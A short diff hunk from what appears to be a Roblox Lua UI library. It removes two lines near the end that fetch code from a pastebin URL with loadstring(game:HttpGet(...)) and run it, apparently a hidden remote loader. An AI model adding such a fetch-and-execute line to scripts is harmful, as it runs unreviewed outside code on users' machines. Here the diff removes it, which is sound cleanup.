@@ -1612,6 +1612,5 @@ end
 
 return window
 end
-local playerInfoScript = loadstring(game:HttpGet('https://pastebin.com/raw/1GH6vZ1S'))()
-playerInfoScript()
+
 return library
